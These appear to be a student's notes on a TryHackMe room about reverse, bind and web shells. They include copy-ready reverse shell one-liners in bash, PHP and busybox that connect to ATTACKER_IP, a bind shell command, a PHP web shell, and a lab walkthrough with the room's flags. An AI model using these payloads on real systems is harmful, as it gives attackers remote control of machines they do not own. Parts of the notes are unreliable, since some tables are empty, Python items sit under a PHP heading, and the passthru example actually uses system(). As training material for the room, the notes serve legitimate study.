# Shells Overview
Learn about different types of shells.

## Content:
<br>[Task 1: Room Introduction](#task-1-room-introduction)
<br>[Task 2: Shell Overview](#task-2-shell-overview)
<br>[Task 3: Reverse Shell](#task-3-reverse-shell)
<br>[Task 4: Bind Shell](#task-4-bind-shell)
<br>[Task 5: Shell Listeners](#task-5-shell-listeners)
<br>[Task 6: Shell Payloads](#task-6-shell-payloads)
<br>[Task 7: Web Shell](#task-7-web-shell)
<br>[Task 8: Practical Task](#task-8-practical-task)
<br>[Task 9: Conclusion](#task-9-conclusion)
<br>[To note](#to-note)

## Task 1: Room Introduction
Shells are used by attackers to remotely control systems.
<ul>
<li>Understand shells in offensive security.</li>
<li>Set up and use reverse and bind shells.</li>
<li>Deploy web shells.</li>
</ul>

## Task 2: Shell Overview
A shell is a software that allows a user to interact with an OS. Depending on OS running on target system, it can be a graphical or a command-line interface. 
<p>
In cybersecurity, it refers to a specific shell session an attacker uses when accesing a compromised system, allowing them to run commands and execute software and so, execute several activities such as
<p>
<ul>
<li>Remote system control</li>
<li>Privilege escalation</li>
<li>Data exfiltration</li>
<li>Persistence and maintenance access</li>
<li>Post-exploitation activities</li>
<li>Access other systems on network</li>
</ul>
<p>
<u><b>THM Questions</b></u>

| Question | Answer |
|----------|--------|
| <i>What is the command-line interface that allows users to interact with an operating system?</i> | Shell |
| <i>What process involves using a compromised system as a launching pad to attack other machines in the network?</li> | Pivoting |
| <i>What is a common activity attackers perform after obtaining shell access to escalate their privileges?</li> | Privilege escalation |

## Task 3: Reverse Shell
A reverse shell, or a connect back shell, has connectiosn initiating from target system to attacker's machine. This can help avoid detection from network firewalls and other security appliances.

<u><b>How reverse shell works</b></u>
| System | Answer |
|--------|--------|
| Attacker's machine | <b>Set up a Netcat (nc) listener</b>; supports multiple OSes and allows reading and writing thru a network. A reverse shell will connect back to attacker's machine, so this machine will be waiting for a connection. Use Netcat to listen to a connection using <code>nc -lvnp 443</code>.<p><ul><li><code>-l</code>: Indicate Netcat to listen or wait for a connection.</li><li><code>-v</code>: Verbose mode.</li><li><code>-n</code>: Prevents connections from using DNS for lookups, so will not resolve hostname and use IP instead.</li><li><code>-p</code>: Indicates port that will be used to wait for the connection.</li> |
| Compromised system | Attacker execute reverse shell payload; abuses vulnerability or unauthorized access granted by attacker and executes command that exposes shell thru network.<p>E.g. <b>pipe reverse shell</b> - Command to expose shell bash thru network to desired listener: <code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f</code>|
| Attacker's machine | Once payload is executed, attacker will receive reverse shell; allows them to execute commands as if they were logging into a regular terminal in OS. |

<p>
<u><b>THM Questions</b></u>

| Question | Answer |
|----------|--------|
| <i>What type of shell allows an attacker to execute commands remotely after the target connects back?</i> | Reverse shell |
| <i>What tool is commonly used to set up a listener for a reverse shell?</li> | Netcat |

## Task 4: Bind Shell
A bind shell will bind a port on compromised system and listen for a connection. When this connection occurs, it exposes the shell session so attacker can execute commands remotely.
<p>
This method can be used when compromised target does not allow outgoing connections, but it tends to be less popz since it needs to remain active and listen for connections, which can lead to detection.

<u><b>How bind shell works</b></u>
| System | Answer |
|--------|--------|
| Target machine | <b>Set up bind shell on target.</b> Command will listen for incoming connections and expose bash shell: <code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| bash -i 2>&1 \| nc -l 0.0.0.0 8080 > /tmp/f</code><br>Need to note that ports below 1024 will require Netcat to be executed with elevated privileges, hence the use of port 8080. |
| Attacker's machine | Now, target machine is waiting for incoming connections, so use Netcat to connect. <code>nc -nv TARGET_IP 8080</code><br>After connection, we can get a shell and execute commands. |
<p>
<u><b>THM Questions</b></u>

| Question | Answer |
|----------|--------|
| <i>What type of shell opens a specific port on the target for incoming connections from the attacker?</i> | Bind shell |
| <i>Listening below which port number requires root access or privileged permissions?</li> | 1024 |

## Task 5: Shell Listeners
Recall: Reverse shell will connect from compromised target to attacker's machine. A utility like Netcat will handle the connection and allow attacker to interact with exposed shell, but there are other utilities/ tools that will also allow us to do that.

| Tool | Description |
|------|-------------|
| Rlwrap | Small utility that uses the GNU readline library to provide editiing keyboard and history.<br>E.g. Wraps Netcat to allow the use of features like arrow keys and history for better interaction: <code>rlwrap nc -lvnp 443</code> |
| Ncat | Improved version of Netcat distributed by NMAP project. Provides extra features like encryption (SSL).<br>E.g. <code>ncat -lvnp 4444</code><br>E.g. To enable SSL encryption for listener: <code>ncat --ssl -lvnp 4444</code> |
| Socat | Utility that allows you to create a socket connection between 2 data sources/ 2 different hosts.<br>E.g. Listen for reverse shell - Enable verbose output (-d, add another -d to increase verbosity of the commands.), create TCP listener on port (TCP-LISTEN:443) to establish a server socket for incoming connections; incoming data will be directed to the terminal (STDOUT): <code>socat -d -d TCP-LISTEN:443 STDOUT</code> |
<p>
<u><b>THM Questions</b></u>

| Question | Answer |
|----------|--------|
| <i>Which flexible networking tool allows you to create a socket connection between two data sources?</i> | socat |
| <i>Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?</li> | rlwrap |
| <i>What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?</i> | ncat |

## Task 6: Shell Payloads
Shell payload can be command or script that
<ul>
<li>Bind shell: Exposes the shell to an incoming connection.</li>
<li>Reverse shell: Send connection.</li>
</ul>

<u><b>[Target machine] Payloads used in Linux OS to expose shell thru reverse shell</b></u>
<p>
<b>Bash</b>

| Payload | Description |
|---------|-------------|
| Normal Bash Reverse Shell | Reverse shell initiates interactive bash shell that redirects input and output thru TCP connection to attacker's IP on port 443.<br><code>bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1</code> |
| Bash Read Line Reverse Shell | Reverse shell creates new file descriptor (5) and connects to TCP socket; will read and execute commands from socket and send output back thru same socket.<br><code>exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 \| while read line; do $line 2>&5 >&5; done </code> |
| Bash with File Descriptor 196 Reverse Shell | Reverse shell uses file descriptor (196) to establish TCP connection; allows shell to read commands form network and send output back thru same connection.<br><code>0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 </code>|
| Bash with File Descriptor 5 Reverse Shell | Similar to 1st e.g., command opens a shell (bash -i) but uses file descriptor (5) for input and output, enabling an interactive session over TCP connection.<br><code>bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5</code> |
<p>
<b>PHP</b>

| Payload | Description |
|---------|-------------|
| PHP Reverse Shell Using exec Function | Reverse shell creates socket connection to attacker's IP on port 443 and uses exec function to execute a shell, redirecting standard input and output.<br><code>php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'</code> |
| PHP Reverse Shell Using shell_exec Function | Similar to previous, but uses shell_exec function.<br><code>php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'</code> |
| PHP Reverse Shell Using system Function | Reverse shell employs system function, which executes command and outputs result to browser.<br><code>php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'</code> |
| PHP Reverse Shell Using passthru Function | passthru function executes command and sends raw output back to browser; useful when working with binary data.<br><code>php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'</code> |
| PHP Reverse Shell Using popen Function | Reverse shell uses opoen to open a process file pointer, allowing shell to be executed.<br><code>php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'</code> |

<b>PHP</b>

| Payload | Description |
|---------|-------------|
| Python Reverse Shell by Exporting Environment Variables | |
| Python Reverse Shell Using subprocess Module | |
| Short Python Reverse Shell | |

<b>Others</b>

| Payload | Description |
|---------|-------------|
| Telnet | |
| AWK | |
| BusyBox | BusyBox reverse shell uses Netcat to connect to attacker. Once connected, it executes /bin/sh, exposing command line to attacker.<br><code>busybox nc ATTACKER_IP 443 -e sh</code> |
<p>
<u><b>THM Questions</b></u>

| Question | Answer |
|----------|--------|
| <i>Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?</i> | subprocess |
| <i>What shell payload method in a common scripting language uses the exec, shell_exec, system, passthru, and popen functions to execute commands remotely through a TCP connection?</li> | PHP |
| <i>Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?</i> | Python |

## Task 7: Web Shell
Web shell is a script written in a language supported by a compromised web server that executes commands thru the web server itself.
<ul>
<li>Usually a file containing the code that executes commands and handles files.</li>
<li>Can be hidden within a compromised web application or service, making it difficult to detect.</li>
<li>Can be written in several languages supported by web servers, e.g. PHP, ASP, JSP, simple CGI scripts.</li>
</ul>
<p>
<b>How web shells work (E.g. PHP web shell):</b>
<br>Shell script:
<code>&lt;?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?&gt;</code>
<ul>
<li>Above shell saved into file with PHP extension, e.g. shell.php, and uploaded into web server by attacker.</li>
<li>Exploit vulnerabilities like unrestricted file upload, file inclusion, command injection or by gaining unauthorized access to it.</li>
<li>After web shell is deployed on server, can be accessed thru URL where web shell is hosted, e.g. http[:]//victim[.]com/uploads/shell[.]php</li>
<li>From code, need to provide a GET method and value of variable cmd, which is the command the attacker wants to execute.</li>
<li>To execute command whoami and display result in web browser, e.g. http[:]//victim[.]com/uploads/shell[.]php?cmd=whoami 
</ul>

<b>(PHP) Web shells available online:</b>
<ul>
<li>p0wny-shell</li>
<li>b374k shell</li>
<li>c99 shell</li>
</ul>
<p>
<u><b>THM Questions</b></u>

| Question | Answer |
|----------|--------|
| <i>What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?</i> | Unrestricted file upload |
| <i>What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?</i> | Web shell |

## Task 8: Practical Task

| Question | Answer |
|----------|--------|
| <i>Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?</i><br>THM{0f28b3e1b00becf15d01a1151baf10fd713bc625} | [Attacker's machine] Set up listener: <code>nc -lvnp 443</code><br>[Compromised web server] Go to 10.48.147.119:8081 and enter <code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| sh -i 2>&1 \| nc 10.48.125.147 443 >/tmp/f</code>.<br>[Attacker's machine] <code>whoami<br>ls l<br>cat /flag.txt</code>|
| <i>Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?</i><br>THM{202bb14ed12120b31300cfbbbdd35998786b44e5}  | [Terminal] Create a shell.php with given script from above.<br>[Browser] Go to 10.48.147.119:8082 and upload the file. To check that it is working, go to 10.48.147.119:8082/uploads/shell.php?cmd=whoami. Then go to 10.48.147.119:8082/uploads/shell.php?cmd=ls%20/. Then go to 10.48.147.119:8082/uploads/shell.php?cmd=cat%20/flag.txt |

## Task 9: Conclusion

| Shell | Description |
|-------|-------------|
| Reverse shell | Establish connection from compromised machine back to attacker's system. |
| Bind shell | Listen for incoming connections on compromised machine, via port. |
| Web shell | Offers attackers a unqiue avenue for exploiting vulnerabilities in web applications. | 

## To note